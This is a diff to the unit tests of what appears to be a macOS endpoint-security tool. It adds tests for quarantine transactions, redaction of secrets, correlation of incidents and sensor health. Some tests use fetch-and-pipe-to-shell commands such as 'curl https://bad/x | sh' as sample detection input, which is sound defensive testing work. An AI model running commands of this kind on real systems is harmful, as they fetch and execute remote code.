@@ -13,6 +13,8 @@ Run:  python3 -m unittest discover -s tests        (from the repo root)
 import json
 import os
 import plistlib
+import shutil
+import sqlite3
 import subprocess
 import sys
 import tempfile
@@ -45,6 +47,7 @@ class Sandbox(unittest.TestCase):
             "SIGCACHE": os.path.join(self.state, "sigcache.json"),
             "ALLOWLIST": os.path.join(self.state, "allowlist.json"),
             "RUN_LOG": os.path.join(self.state, "run.log"),
+            "EVENT_DB": os.path.join(self.state, "aegis.db"),
             "SELFSTATE": os.path.join(self.state, "selfstate.json"),
             "SELF_PLIST": os.path.join(self.state, "com.charlie.aegis.plist"),
             "PERSISTENCE_DIRS": [self.pers],
@@ -102,7 +105,17 @@ class Sandbox(unittest.TestCase):
     def tearDown(self):
         for k, v in self._saved.items():
             setattr(aegis, k, v)
-        subprocess.run(["rm", "-rf", self.tmp], check=False)
+
+        for root, dirs, files in os.walk(self.tmp, topdown=True):
+            os.chmod(root, 0o700)
+            for name in dirs:
+                os.chmod(os.path.join(root, name), 0o700)
+            for name in files:
+                try:
+                    os.chmod(os.path.join(root, name), 0o600)
+                except OSError:
+                    pass
+        shutil.rmtree(self.tmp)
 
     # helpers -------------------------------------------------------------
     def write_plist(self, name, program_args, program=None, run_at_load=True):
@@ -1162,28 +1175,154 @@ class TestResponseTier(Sandbox):
         self.assertEqual(len(man), 1, man)
         return next(iter(man))
 
+    def _payload(self, qid):
+        return aegis._quarantine_payload(qid)
+
     # quarantine ----------------------------------------------------------
     def test_quarantine_removes_original(self):
         p, _sha, _d = self._victim()
         self.assertEqual(aegis.cmd_quarantine(p), 0)
         self.assertFalse(os.path.exists(p), "original not removed after quarantine")
 
-    def test_quarantine_neutralizes_stored_bytes(self):
+    def test_quarantine_store_seals_without_mutating_object(self):
         p, _sha, data = self._victim()
         aegis.cmd_quarantine(p)
         qid = self._only_qid()
-        payload = os.path.join(aegis.QUARANTINE_DIR, qid, "payload.quar")
-        os.chmod(payload, 0o600)
-        stored = open(payload, "rb").read()
-        # The store copy must NOT be the raw malware bytes (neutered-sample rule:
-        # can't be accidentally executed, won't be re-flagged by another scanner).
-        self.assertNotEqual(stored, data, "quarantined payload is NOT neutralized")
+        payload = self._payload(qid)
+        sealed = os.path.dirname(payload)
+        self.assertEqual(os.stat(sealed).st_mode & 0o777, 0,
+                         "quarantine container is traversable")
+        os.chmod(sealed, 0o700)
+        with open(payload, "rb") as f:
+            stored = f.read()
+        # A native rename preserves every byte and macOS object attribute. Safety
+        # comes from a non-executable name inside a sealed container, not by
+        # transforming the only recoverable copy.
+        self.assertEqual(stored, data)
 
-    def test_quarantine_payload_not_world_readable(self):
+    def test_quarantine_payload_not_world_reachable(self):
         p, _sha, _d = self._victim()
         aegis.cmd_quarantine(p)
-        payload = os.path.join(aegis.QUARANTINE_DIR, self._only_qid(), "payload.quar")
-        self.assertEqual(os.stat(payload).st_mode & 0o777, 0, "payload not chmod 000")
+        payload = self._payload(self._only_qid())
+        self.assertEqual(os.stat(os.path.dirname(payload)).st_mode & 0o777, 0)
+
+    def test_quarantine_transaction_recovers_after_rename_crash(self):
+        p, sha, _d = self._victim()
+        saved = aegis._RESPONSE_FAILPOINT
+
+        def crash(stage):
+            if stage == "after-quarantine-rename":
+                raise RuntimeError("injected crash")
+
+        aegis._RESPONSE_FAILPOINT = crash
+        try:
+            with self.assertRaises(RuntimeError):
+                aegis.cmd_quarantine(p)
+        finally:
+            aegis._RESPONSE_FAILPOINT = saved
+        self.assertFalse(os.path.exists(p))
+        # Simulates the next process start: per-item txn.json, not manifest.json,
+        # is authoritative and must finalize the contained object idempotently.
+        aegis.recover_quarantine()
+        qid = self._only_qid()
+        self.assertEqual(aegis.cmd_restore(qid), 0)
+        self.assertEqual(aegis.sha256(p), sha)
+
+    def test_action_audit_failure_blocks_precommit_mutation(self):
+        p, _sha, _d = self._victim()
+        saved = aegis.log_action
+        aegis.log_action = lambda *a, **k: False
+        try:
+            self.assertNotEqual(aegis.cmd_quarantine(p), 0)
+        finally:
+            aegis.log_action = saved
+        self.assertTrue(os.path.exists(p), "audit failure still moved the source")
+
+    def test_terminal_audit_failure_is_retried_by_recovery(self):
+        p, _sha, _d = self._victim()
+        saved = aegis.log_action
+        calls = []
+
+        def flaky(*args, **kwargs):
+            calls.append((args, kwargs))
+            return len(calls) != 2
+
+        aegis.log_action = flaky
+        try:
+            self.assertNotEqual(aegis.cmd_quarantine(p), 0)
+        finally:
+            aegis.log_action = saved
+        qid = self._only_qid()
+        self.assertFalse(aegis._strict_json(aegis._quarantine_txn(qid))
+                         ["audit_terminal"])
+        aegis.recover_quarantine()
+        self.assertTrue(aegis._strict_json(aegis._quarantine_txn(qid))
+                        ["audit_terminal"])
+
+    def test_manifest_is_rebuilt_from_authoritative_transactions(self):
+        p, _sha, _d = self._victim()
+        self.assertEqual(aegis.cmd_quarantine(p), 0)
+        qid = self._only_qid()
+        with open(aegis.QUARANTINE_MANIFEST, "w") as f:
+            f.write("{broken")
+        aegis.recover_quarantine()
+        self.assertIn(qid, aegis.load_json(aegis.QUARANTINE_MANIFEST, {}))
+
+    def test_app_bundle_round_trip_preserves_tree_and_metadata(self):
+        bundle = os.path.join(self.tmp, "Suspect.app")
+        macos = os.path.join(bundle, "Contents", "MacOS")
+        os.makedirs(macos)
+        with open(os.path.join(bundle, "Contents", "Info.plist"), "wb") as f:
+            plistlib.dump({"CFBundleExecutable": "payload"}, f)
+        exe = os.path.join(macos, "payload")
+        with open(exe, "wb") as f:
+            f.write(b"#!/bin/sh\necho payload\n")
+        os.chmod(exe, 0o751)
+        stamp = 1_700_000_000_123_456_789
+        os.utime(exe, ns=(stamp, stamp))
+        before = aegis._object_digest(bundle)
+        self.assertEqual(aegis.cmd_quarantine(bundle), 0)
+        qid = self._only_qid()
+        self.assertEqual(aegis.cmd_restore(qid), 0)
+        self.assertEqual(aegis._object_digest(bundle), before)
+        self.assertEqual(os.stat(exe).st_mode & 0o777, 0o751)
+        self.assertEqual(os.stat(exe).st_mtime_ns, stamp)
+
+    def test_app_bundle_external_aliases_are_refused(self):
+        for alias_kind in ("hardlink", "symlink"):
+            with self.subTest(alias_kind=alias_kind):
+                bundle = os.path.join(self.tmp, "%s.app" % alias_kind)
+                macos = os.path.join(bundle, "Contents", "MacOS")
+                os.makedirs(macos)
+                with open(os.path.join(bundle, "Contents", "Info.plist"), "wb") as f:
+                    plistlib.dump({"CFBundleExecutable": "payload"}, f)
+                exe = os.path.join(macos, "payload")
+                with open(exe, "wb") as f:
+                    f.write(b"payload")
+                external = os.path.join(self.tmp, "%s.external" % alias_kind)
+                if alias_kind == "hardlink":
+                    os.link(exe, external)
+                else:
+                    with open(external, "wb") as f:
+                        f.write(b"outside")
+                    os.symlink(external, os.path.join(bundle, "external-link"))
+                self.assertNotEqual(aegis.cmd_quarantine(bundle), 0)
+                self.assertTrue(os.path.exists(bundle))
+                self.assertTrue(os.path.exists(external))
+
+    def test_regular_directory_is_still_refused(self):
+        d = os.path.join(self.tmp, "not-an-app")
+        os.makedirs(d)
+        self.assertNotEqual(aegis.cmd_quarantine(d), 0)
+        self.assertTrue(os.path.isdir(d))
+
+    def test_hard_linked_file_is_refused(self):
+        p, _sha, _d = self._victim()
+        link = p + ".link"
+        os.link(p, link)
+        self.assertNotEqual(aegis.cmd_quarantine(p), 0)
+        self.assertTrue(os.path.exists(p))
+        self.assertTrue(os.path.exists(link))
 
     # restore -------------------------------------------------------------
     def test_restore_is_byte_identical(self):
@@ -1209,9 +1348,10 @@ class TestResponseTier(Sandbox):
         with open(p, "wb") as f:  # something else now occupies the original path
             f.write(b"a different file took the slot")
         aegis.cmd_restore(qid)
-        self.assertTrue(os.path.exists(p + ".restored"),
-                        "collision restore did not fall back to .restored")
-        self.assertEqual(aegis.sha256(p + ".restored"), sha)
+        restored = p + ".restored." + qid
+        self.assertTrue(os.path.exists(restored),
+                        "collision restore did not use a unique safe path")
+        self.assertEqual(aegis.sha256(restored), sha)
 
     # destroy (the only irreversible verb) --------------------------------
     def test_destroy_refuses_without_confirmation(self):
@@ -1263,7 +1403,8 @@ class TestResponseTier(Sandbox):
         p, _sha, _d = self._victim()
         aegis.cmd_quarantine(p)
         self.assertTrue(os.path.exists(aegis.ACTION_LOG))
-        recs = [json.loads(l) for l in open(aegis.ACTION_LOG) if l.strip()]
+        with open(aegis.ACTION_LOG) as audit:
+            recs = [json.loads(line) for line in audit if line.strip()]
         self.assertTrue(any(r["action"] == "quarantine" and r["result"] == "ok"
                             for r in recs), recs)
 
@@ -1306,13 +1447,18 @@ class TestResponseTier(Sandbox):
         self.assertTrue(any(m.get("orig_path") == os.path.realpath(plist)
                             for m in man.values()), man)
 
-    # sandbox (real deny-default Seatbelt jail) ---------------------------
-    def test_sandbox_runs_and_refuses_nonfile(self):
+    # sandbox-exec is not a supported malware boundary --------------------
+    def test_sandbox_refuses_to_execute_on_the_host(self):
         self.assertNotEqual(
             aegis.cmd_sandbox(os.path.join(self.tmp, "nope")), 0)
-        if os.path.exists("/usr/bin/sandbox-exec") and os.path.exists("/bin/echo"):
-            # A benign binary runs to completion inside the jail (returns 0).
-            self.assertEqual(aegis.cmd_sandbox("/bin/echo", ["ok"]), 0)
+        saved = aegis.run
+        calls = []
+        aegis.run = lambda *a, **k: calls.append(a) or ("", "", 0)
+        try:
+            self.assertNotEqual(aegis.cmd_sandbox("/bin/echo", ["ok"]), 0)
+        finally:
+            aegis.run = saved
+        self.assertEqual(calls, [], "sandbox command executed a host process")
 
 
 # --------------------------------------------------------------------------- #
@@ -1371,7 +1517,8 @@ class TestListenerSurface(Sandbox):
         self.notifications.clear()
         aegis.cmd_scan(quiet=True)
         self.assertEqual(self.notifications, [])
-        base = json.load(open(aegis.BASELINE))
+        with open(aegis.BASELINE) as stored:
+            base = json.load(stored)
         self.assertIn("listeners", base)
 
 
@@ -1493,6 +1640,27 @@ class TestWatchKqueue(Sandbox):
             t.join()
             self.assertTrue(fired, "file creation in a watched dir must wake")
             self.assertLess(elapsed, 5, "wake must be event-speed, not timeout")
+        finally:
+            aegis._close_watch(kq, fds)
+
+    def test_in_place_persistence_edit_wakes_watch(self):
+        import threading
+        plist = self.write_plist("com.example.direct.plist", ["/bin/true"])
+        self.assertIn(plist, aegis._watch_paths(),
+                      "existing high-value children must be armed directly")
+        kq, fds = aegis._build_watch()
+        try:
+            def mutate():
+                with open(plist, "ab") as target:
+                    target.write(b"\n")
+                    target.flush()
+
+            timer = threading.Timer(0.3, mutate)
+            timer.start()
+            started = time.time()
+            self.assertTrue(aegis._wait_for_change(kq, 10))
+            self.assertLess(time.time() - started, 5)
+            timer.join()
         finally:
             aegis._close_watch(kq, fds)
 
@@ -1808,6 +1976,8 @@ class TestInstaller(unittest.TestCase):
         env = dict(os.environ)
         env["HOME"] = self.home
         env["PATH"] = self.bin + os.pathsep + env["PATH"]
+        env["AEGIS_TESTING"] = "1"
+        env["AEGIS_TEST_LAUNCHCTL"] = os.path.join(self.bin, "launchctl")
         r = subprocess.run(["bash", os.path.join(self.repo, "install.sh"), *args],
                            env=env, capture_output=True, text=True)
         self.assertEqual(r.returncode, 0, r.stderr)
@@ -1845,6 +2015,22 @@ class TestInstaller(unittest.TestCase):
         r = subprocess.run(["bash", os.path.join(self.repo, "install.sh"), "abc"],
                            env=env, capture_output=True, text=True)
         self.assertNotEqual(r.returncode, 0)
+
+    def test_rejects_zero_and_extra_arguments(self):
+        env = dict(os.environ)
+        env["HOME"] = self.home
+        for args in (("0",), ("watch", "600", "extra")):
+            r = subprocess.run(["bash", os.path.join(self.repo, "install.sh"), *args],
+                               env=env, capture_output=True, text=True)
+            self.assertNotEqual(r.returncode, 0, args)
+
+    def test_runtime_install_is_private_and_fda_is_not_recommended(self):
+        self._install("3600")
+        runtime = os.path.join(self.home, ".aegis", "aegis.py")
+        self.assertEqual(os.stat(runtime).st_mode & 0o777, 0o700)
+        with open(os.path.join(self.repo, "install.sh")) as f:
+            script = f.read()
+        self.assertNotIn("grant FDA to /usr/bin/python3", script)
 
 
 # =========================================================================== #
@@ -2243,6 +2429,252 @@ class TestSelfProtectionBaselineDeletion(Sandbox):
         os.remove(aegis.BASELINE)                 # attacker removes the trust store
         self.assertTrue(self._tamper_findings(aegis.check_self_protection()),
                         "out-of-band DELETION of baseline.json must be flagged")
+
+
+# --------------------------------------------------------------------------- #
+# Durable Swiss-cheese core: every layer reports health; findings become
+# redacted observations/signals; related signals become actionable incidents.
+# --------------------------------------------------------------------------- #
+class TestPrivacyBoundary(Sandbox):
+    def test_secrets_are_redacted_before_any_persistence(self):
+        secret = "sk-live-ThisMustNeverReachDisk"
+        f = aegis.finding(
+            "HIGH", "behavior", "Suspicious command",
+            "curl -H 'Authorization: Bearer %s' https://x/?token=%s "
+            "password=hunter2" % (secret, secret), "privacy:1")
+        self.assertNotIn(secret, f["detail"])
+        self.assertNotIn("hunter2", f["detail"])
+        aegis.write_report([f], False)
+        aegis.emit([f], False)
+        aegis.record_security_state([f])
+        aegis.log_action("privacy-test", "token=%s" % secret, "refused",
+                         authorization="Bearer %s" % secret)
+        aegis.log_run("password=hunter2 token=%s" % secret)
+        for root, _dirs, files in os.walk(self.state):
+            for name in files:
+                path = os.path.join(root, name)
+                with open(path, "rb") as stored:
+                    self.assertNotIn(secret.encode(), stored.read(), path)
+
+
+class TestEventIncidentCore(Sandbox):
+    def _rows(self, sql, args=()):
+        with sqlite3.connect(aegis.EVENT_DB) as db:
+            return db.execute(sql, args).fetchall()
+
+    def test_schema_is_idempotent_and_private(self):
+        aegis.init_event_store()
+        aegis.init_event_store()
+        self.assertEqual(os.stat(aegis.EVENT_DB).st_mode & 0o777, 0o600)
+        tables = {row[0] for row in self._rows(
+            "SELECT name FROM sqlite_master WHERE type='table'")}
+        self.assertTrue({"events", "signals", "incidents", "sensor_status"}
+                        <= tables)
+
+    def test_each_observation_is_an_event_but_signal_upserts(self):
+        f = aegis.finding("HIGH", "behavior", "Fileless fetch execute",
+                          "curl https://bad/x | sh", "behavior:fetch:1",
+                          markers=["fileless-fetch-exec"])
+        aegis.record_security_state([f], now=1_700_000_000)
+        aegis.record_security_state([f], now=1_700_000_010)
+        self.assertEqual(self._rows("SELECT count(*) FROM events")[0][0], 2)
+        self.assertEqual(self._rows("SELECT count(*) FROM signals")[0][0], 1)
+        self.assertEqual(self._rows(
+            "SELECT occurrence_count FROM signals")[0][0], 2)
+
+    def test_clickfix_multilayer_chain_creates_one_incident(self):
+        fs = [
+            aegis.finding("HIGH", "behavior", "Fileless fetch execute",
+                          "curl https://bad/x | sh", "behavior:fetch:2",
+                          markers=["fileless-fetch-exec"], path="/tmp/drop"),
+            aegis.finding("HIGH", "persistence", "New persistence item",
+                          "/tmp/drop -> ~/Library/LaunchAgents/x.plist",
+                          "persistence:new:2", path="/tmp/drop"),
+        ]
+        aegis.record_security_state(fs, now=1_700_000_000)
+        incidents = aegis.list_incidents()
+        matching = [i for i in incidents
+                    if i["correlation_key"].startswith("chain:clickfix:")]
+        self.assertEqual(len(matching), 1, incidents)
+        self.assertGreaterEqual(matching[0]["evidence_count"], 2)
+        self.assertEqual(matching[0]["severity"], "CRITICAL")
+
+    def test_correlation_requires_same_entity_inside_window(self):
+        behavior = aegis.finding(
+            "HIGH", "behavior", "Fileless fetch execute", "curl bad | sh",
+            "behavior:window:1", markers=["fileless-fetch-exec"],
+            path="/tmp/first")
+        other_persistence = aegis.finding(
+            "HIGH", "persistence", "New persistence item", "other",
+            "persistence:window:1", path="/tmp/first-stage")
+        aegis.record_security_state([behavior, other_persistence],
+                                    now=1_700_000_000)
+        self.assertFalse(any(i["correlation_key"].startswith("chain:clickfix:")
+                             for i in aegis.list_incidents()))
+        late_persistence = aegis.finding(
+            "HIGH", "persistence", "New persistence item", "late",
+            "persistence:window:2", path="/tmp/first")
+        aegis.record_security_state([late_persistence], now=1_700_001_000)
+        self.assertFalse(any(i["correlation_key"].startswith("chain:clickfix:")
+                             for i in aegis.list_incidents()))
+
+    def test_chain_promotion_closes_prior_standalone_incident(self):
+        behavior = aegis.finding(
+            "HIGH", "behavior", "Fileless fetch execute", "curl bad | sh",
+            "behavior:promote:1", markers=["fileless-fetch-exec"],
+            path="/tmp/promoted")
+        aegis.record_security_state([behavior], now=1_700_000_000)
+        leaf = aegis.list_incidents()[0]
+        self.assertEqual(leaf["kind"], "signal")
+        persistence = aegis.finding(
+            "HIGH", "persistence", "New persistence item", "promoted",
+            "persistence:promote:1", path="/tmp/promoted")
+        aegis.record_security_state([persistence], now=1_700_000_010)
+        active = aegis.list_incidents()
+        chains = [i for i in active
+                  if i["correlation_key"].startswith("chain:clickfix:")]
+        self.assertEqual(len(chains), 1, active)
+        self.assertFalse(any(i["id"] == leaf["id"] for i in active), active)
+        old = aegis.incident_detail(leaf["id"])
+        self.assertEqual(old["status"], "RESOLVED")
+        self.assertIn("promoted into incident", old["resolution"])
+
+    def test_remote_and_background_item_rules_match_live_categories(self):
+        findings = [
+            aegis.finding("HIGH", "persistence", "SSH key changed", "remote",
+                          "persistence:contract:remote", path="/tmp/remote"),
+            aegis.finding("HIGH", "net-listener", "New listener", "remote",
+                          "listener:contract:remote", path="/tmp/remote"),
+            aegis.finding("HIGH", "btm", "Background item changed", "supply",
+                          "btm:contract:supply", path="/tmp/supply"),
+            aegis.finding("HIGH", "process", "Risky process", "supply",
+                          "process:contract:supply", path="/tmp/supply"),
+        ]
+        aegis.record_security_state(findings, now=1_700_000_000)
+        keys = {i["correlation_key"] for i in aegis.list_incidents()}
+        self.assertTrue(any(k.startswith("chain:remote-access:") for k in keys),
+                        keys)
+        self.assertTrue(any(k.startswith("chain:supply-chain:") for k in keys),
+                        keys)
+
+    def test_unrelated_single_medium_signal_does_not_make_incident(self):
+        f = aegis.finding("MEDIUM", "browser-extension", "New extension",
+                          "id=legit", "extension:one")
+        aegis.record_security_state([f], now=1_700_000_000)
+        self.assertEqual(aegis.list_incidents(), [])
+
+    def test_incident_lifecycle_enforces_transitions(self):
+        f = aegis.finding("HIGH", "canary", "Canary changed", "changed",
+                          "canary:changed:1")
+        aegis.record_security_state([f], now=1_700_000_000)
+        incident = aegis.list_incidents()[0]
+        self.assertTrue(aegis.transition_incident(incident["id"], "ACK",
+                                                  now=1_700_000_010))
+        self.assertTrue(aegis.transition_incident(incident["id"], "INVESTIGATING",
+                                                  now=1_700_000_020))
+        self.assertTrue(aegis.transition_incident(incident["id"], "RESOLVED",
+                                                  now=1_700_000_030))
+        self.assertFalse(aegis.transition_incident(incident["id"], "CONTAINED",
+                                                   now=1_700_000_040))
+        self.assertEqual(aegis.incident_detail(incident["id"])["status"],
+                         "RESOLVED")
+
+    def test_open_incident_reminders_are_bounded(self):
+        f = aegis.finding("HIGH", "canary", "Canary changed", "changed",
+                          "canary:changed:2")
+        aegis.record_security_state([f], now=1_700_000_000,
+                                    initially_notified=True)
+        self.assertEqual(aegis.claim_due_incident_reminders(1_700_003_599), [])
+        first = aegis.claim_due_incident_reminders(1_700_003_600)
+        self.assertEqual(len(first), 1)
+        second = aegis.claim_due_incident_reminders(1_700_086_400)
+        self.assertEqual(len(second), 1)
+        third = aegis.claim_due_incident_reminders(1_700_259_200)
+        self.assertEqual(len(third), 1)
+        self.assertEqual(aegis.claim_due_incident_reminders(1_800_000_000), [])
+
+
+class TestSensorHealthCore(Sandbox):
+    def test_failed_sensor_is_durable_and_never_rendered_clean(self):
+        health = []
+
+        def broken():
+            raise RuntimeError("permission denied")
+
+        self.assertEqual(aegis._collect_sensor("test.sensor", broken, health), [])
+        self.assertEqual(health[0]["status"], "FAILED")
+        aegis.record_security_state([], sensor_health=health, now=1_700_000_000)
+        status = {row["sensor_id"]: row for row in aegis.get_sensor_health()}
+        self.assertEqual(status["test.sensor"]["status"], "FAILED")
+        self.assertIn("permission denied", status["test.sensor"]["detail"])
+
+    def test_three_failures_create_one_health_incident_and_recovery_resets(self):
+        for tick in range(3):
+            aegis.record_security_state([], sensor_health=[{
+                "sensor_id": "critical.sensor", "status": "FAILED",
+                "detail": "timeout", "duration_ms": 5, "item_count": 0,
+            }], now=1_700_000_000 + tick)
+        incidents = [i for i in aegis.list_incidents()
+                     if i["correlation_key"] == "sensor:critical.sensor"]
+        self.assertEqual(len(incidents), 1)
+        aegis.record_security_state([], sensor_health=[{
+            "sensor_id": "critical.sensor", "status": "OK", "detail": "",
+            "duration_ms": 2, "item_count": 0,
+        }], now=1_700_000_010)
+        status = {row["sensor_id"]: row for row in aegis.get_sensor_health()}
+        self.assertEqual(status["critical.sensor"]["consecutive_failures"], 0)
+
+    def test_hardening_command_failure_is_unknown_not_off(self):
+        saved = aegis.run
+        aegis.run = lambda *a, **k: ("", "permission denied", 1)
+        try:
+            findings = aegis.check_hardening()
+        finally:
+            aegis.run = saved
+        fps = {f["fingerprint"] for f in findings}
+        self.assertTrue(any(fp.endswith(":unknown") for fp in fps), fps)
+        self.assertFalse(any(fp.endswith(":off") or fp.endswith(":on")
+                             for fp in fps), fps)
+
+
+class TestDurabilityAndCommandBoundary(Sandbox):
+    def test_save_json_flushes_content_and_keeps_private_mode(self):
+        calls = []
+        saved = aegis._sync_fd
+        aegis._sync_fd = lambda fd: (calls.append(fd), saved(fd))[1]
+        target = os.path.join(self.state, "durable.json")
+        try:
+            aegis.save_json(target, {"complete": True})
+        finally:
+            aegis._sync_fd = saved
+        self.assertTrue(calls, "content must be flushed before atomic publish")
+        self.assertEqual(os.stat(target).st_mode & 0o777, 0o600)
+        with open(target) as stored:
+            self.assertEqual(json.load(stored), {"complete": True})
+
+    def test_system_tools_use_absolute_path_and_sanitized_environment(self):
+        captured = {}
+        saved = aegis.subprocess.run
+
+        class Result:
+            stdout = "ok"
+            stderr = ""
+            returncode = 0
+
+        def fake_run(cmd, **kwargs):
+            captured["cmd"] = cmd
+            captured["env"] = kwargs["env"]
+            return Result()
+
+        aegis.subprocess.run = fake_run
+        try:
+            out, _err, rc = aegis.run(["codesign", "-dv", "/tmp/example"])
+        finally:
+            aegis.subprocess.run = saved
+        self.assertEqual((out, rc), ("ok", 0))
+        self.assertEqual(captured["cmd"][0], "/usr/bin/codesign")
+        self.assertEqual(captured["env"]["PATH"],
+                         "/usr/bin:/bin:/usr/sbin:/sbin")
 
 
 if __name__ == "__main__":
